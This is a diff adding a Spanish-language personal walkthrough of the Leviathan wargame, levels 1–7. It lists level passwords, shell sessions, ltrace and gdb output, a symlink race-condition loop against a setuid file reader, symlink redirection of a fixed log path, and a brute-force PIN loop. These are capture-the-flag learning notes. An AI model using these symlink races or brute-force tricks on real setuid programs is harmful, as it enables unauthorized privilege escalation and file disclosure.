@@ -1,0 +1,285 @@
+1.  La contraseña está en `.backup` dentro de los bookmarks
+
+    ```
+    rioGegei8m
+    ```
+No funcionó buscar las cadenas en el programa.
+
+```
+leviathan1@leviathan:/tmp/cm6xsZ$ strings ~/check | tail +14 | head
+PTRhp
+QVh;
+secrf
+love
+UWVS
+t$,U
+[^_]
+password:
+/bin/sh
+Wrong password, Good Bye ...
+```
+
+```
+leviathan1@leviathan:/tmp/cm6xsZ$ cat /etc/leviathan_pass/leviathan1
+rioGegei8m
+```
+
+```
+gdb check
+break main
+break strcmp
+command
+  info registers
+  bt full
+end
+run
+```
+
+```
+frame_dummy
+```
+
+```
+hexdump check | less
+sex.secret.god.love
+```
+
+La contraseña del programa es `sex`.
+
+ougahZi8Ta
+No funcionó usar un enlace simbólico con otro nombre.
+
+```
+leviathan2@leviathan:/tmp$ delete_me=$(mktemp -d /tmp/XXX)
+leviathan2@leviathan:/tmp$ cd $delete_me
+leviathan2@leviathan:/tmp/0ZJ$ ln -s /etc/leviathan_pass/leviathan3 prueba
+leviathan2@leviathan:/tmp/0ZJ$ ls -la
+total 228
+drwx--S---   2 leviathan2 root   4096 Jan 26 03:22 .
+drwxrws-wt 270 root       root 225280 Jan 26 03:22 ..
+lrwxrwxrwx   1 leviathan2 root     30 Jan 26 03:22 prueba -> /etc/leviathan_pass/leviathan3
+leviathan2@leviathan:/tmp/0ZJ$ ~/printfile prueba
+You cant have that file...
+```
+
+No se puede hacer un enlace duro porque `/tmp` no está en el mismo disco que `/`
+
+```
+ln /etc/leviathan_pass/leviathan3
+```
+
+```
+leviathan2@leviathan:/tmp/6bsq$ file ~/printfile
+/home/leviathan2/printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=46891a094764828605a00c0c38abfccbe4b46548, not stripped
+leviathan2@leviathan:/tmp/6bsq$ ~/printfile /etc/leviathan_pass/leviathan0
+You cant have that file...
+leviathan2@leviathan:/tmp/6bsq$ ~/printfile /etc/leviathan_pass/leviathan1
+You cant have that file...
+leviathan2@leviathan:/tmp/6bsq$ ~/printfile /etc/leviathan_pass/leviathan2
+sh: 0: getcwd() failed: No such file or directory
+/bin/cat: /etc/leviathan_pass/leviathan2: Permission denied
+leviathan2@leviathan:/tmp/6bsq$ ~/printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
+leviathan2@leviathan:/tmp/6bsq$ ~/printfile /etc/leviathan_pass/leviathan4
+You cant have that file...
+leviathan2@leviathan:/tmp/6bsq$ ~/printfile /etc/leviathan_pass/leviathan5
+You cant have that file...
+leviathan2@leviathan:/tmp/6bsq$ ~/printfile /etc/leviathan_pass/leviathan6
+You cant have that file...
+leviathan2@leviathan:/tmp/6bsq$ ~/printfile /etc/leviathan_pass/leviathan7
+You cant have that file...
+```
+
+Aprendí que los programas pueden tener "race conditions"
+y a usar el programa `ltrace` para diagnosticar las llamadas al sistema
+que ejecuta un programa.
+
+```
+# En una terminal
+leviathan2@leviathan:/tmp$ while true; do ln -sf /etc/leviathan_pass/leviathan2 prueba; ln -sf /etc/leviathan_pass/leviathan3 prueba; done
+# en otra terminal:
+leviathan2@leviathan:/tmp$ while true; do ./printfile /tmp/prueba | grep -v cant ; done
+Ahdiemoo1j
+```
+
+leviathan 3:
+
+El programa nos pide una contraseña.
+
+Usando ltrace puedo tener acceso a la contraseña que es `snlprintf`.
+
+```
+leviathan3@leviathan:~$ ltrace ./level3 snlprintf^C
+leviathan3@leviathan:~$ gdb ./level3
+GNU gdb (Debian 7.12-6) 7.12.0.20161007-git
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from ./level3...done.
+(gdb) break setreuid
+Breakpoint 1 at 0x8048430
+(gdb) break geteuid
+Breakpoint 2 at 0x8048400
+(gdb) break system
+Breakpoint 3 at 0x8048420
+(gdb) run
+Starting program: /home/leviathan3/level3
+Enter the password> snlprintf
+[You've got shell]!
+
+```
+
+```
+leviathan3@leviathan:~$ ltrace ./level3 snlprintf
+__libc_start_main(0x8048618, 2, 0xffffd784, 0x80486d0 <unfinished ...>
+strcmp("h0no33", "kakaka")                                                                                                                                               = -1
+printf("Enter the password> ")                                                                                                                                           = 20
+fgets(Enter the password> snlprintf
+"snlprintf\n", 256, 0xf7fc55a0)                                                                                                                                    = 0xffffd590
+strcmp("snlprintf\n", "snlprintf\n")                                                                                                                                     = 0
+puts("[You've got shell]!"[You've got shell]!
+)                                                                                                                                              = 20
+geteuid()                                                                                                                                                                = 12003
+geteuid()                                                                                                                                                                = 12003
+setreuid(12003, 12003)                                                                                                                                                   = 0
+system("/bin/sh"$
+```
+
+Me parece que tengo que cambiar el valor del por `setreuid(12004, 12004)`
+pero no sé como, intenté
+
+```
+gdb ./level3
+break setreuid
+info registers
+```
+
+No me dejaba usar, tal vez porque estaba dentro del contexto de ltrace
+
+```
+leviathan3@leviathan:~$ ./level3
+Enter the password> snlprintf
+[You've got shell]!
+$ cat /etc/leviathan_pass/leviathan4
+vuH0coox6m
+```
+
+**Leviathan 4** (vuH0coox6m)
+
+Hay un directorio que se llama trash que contiene un bin.
+
+```
+leviathan4@leviathan:~/.trash$ ./bin
+01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
+leviathan4@leviathan:~/.trash$ ltrace ./bin
+__libc_start_main(0x80484bb, 1, 0xffffd774, 0x80485b0 <unfinished ...>
+fopen("/etc/leviathan_pass/leviathan5", "r")                                                                                                                             = 0
++++ exited (status 255) +++
+```
+
+ltrace dice que está leyendo el archivo, así que parece que esta es la clave en binario.
+
+[Buscando herramientas que permitan ver el binary dump](https://getkt.com/blog/linux-command-line-tools-to-dump-files-in-hex-octal-binary/)
+
+[Con este convertidor de binario a ascii](https://www.binaryhexconverter.com/binary-to-ascii-text-converter) obtengo:
+
+Tith4cokei
+
+**Leviathan 5**: (Tith4cokei)
+
+```
+leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log; ltrace ./leviathan5
+__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
+fopen("/tmp/file.log", "r")                                                                                                                                              = 0
+puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
+)                                                                                                                                        = 26
+exit(-1 <no return ...>
++++ exited (status 255) +++
+leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log; ltrace ./leviathan5
+ln: failed to create symbolic link '/tmp/file.log': File exists
+__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
+fopen("/tmp/file.log", "r")                                                                                                                                              = 0
+puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
+)                                                                                                                                        = 26
+exit(-1 <no return ...>
++++ exited (status 255) +++
+leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log; ./leviathan5
+ln: failed to create symbolic link '/tmp/file.log': File exists
+UgaoFee4li
+```
+
+El archivo lee un archivo específico, así que hacemos un enlace simbólico al archivo que nos interesa.
+
+```
+leviathan5@leviathan:~$ ln -sf /etc/leviathan_pass/leviathan6 /tmp/file.log; ./leviathan5
+UgaoFee4li
+```
+
+**leviathan 6**: (UgaoFee4li)
+
+Este es un sistema de fuerza bruta con 1000 códigos posibles.
+
+
+```
+for i in $(seq 0 9999); do  ./leviathan6 $(printf "%04.0f" $i) ; done  | grep -v Wrong
+```
+
+seq 0 9999 | xargs -l printf "%04.0f\n"
+
+```
+leviathan6@leviathan:~$ ulimit -a
+core file size          (blocks, -c) 10240
+data seg size           (kbytes, -d) unlimited
+scheduling priority             (-e) 0
+file size               (blocks, -f) 102400
+pending signals                 (-i) 3887
+max locked memory       (kbytes, -l) 64
+max memory size         (kbytes, -m) 20000
+open files                      (-n) 1024
+pipe size            (512 bytes, -p) 8
+POSIX message queues     (bytes, -q) 819200
+real-time priority              (-r) 0
+stack size              (kbytes, -s) 8192
+cpu time               (seconds, -t) 3600
+max user processes              (-u) 150
+virtual memory          (kbytes, -v) 409600
+file locks                      (-x) unlimited
+```
+
+
+Parece que si lo retraso con ltrace no se muestra el error, así que usaré el siguiente comando y luego reviso:
+
+
+```
+seq 0 9999 | xargs -P 1 printf "%04.0f\n" | xargs -P 1 -I @ sh -c 'ltrace ./leviathan6 @ || true'
+```
+
+
+```
+leviathan6@leviathan:~$ for i in $(seq 0000 9999); do echo -e $i;  ./leviathan6 $i; done
+leviathan7@leviathan:~$ cat /etc/leviathan_pass/leviathan7
+ahy7MaeBo9
+
+leviathan6@leviathan:~$ ./leviathan6 7123
+$
+leviathan6@leviathan:~$ ltrace ./leviathan6 7123
+__libc_start_main(0x804853b, 2, 0xffffd774, 0x80485e0 <unfinished ...>
+atoi(0xffffd8ac, 0, 0xf7e40890, 0x804862b)                                                                                                                               = 7123
+geteuid()                                                                                                                                                                = 12006
+geteuid()                                                                                                                                                                = 12006
+setreuid(12006, 12006)                                                                                                                                                   = 0
+system("/bin/sh"$
+```
+
+Aprendí que necesito mantener la interactividad
+y programas como `xargs` no permiten eso.
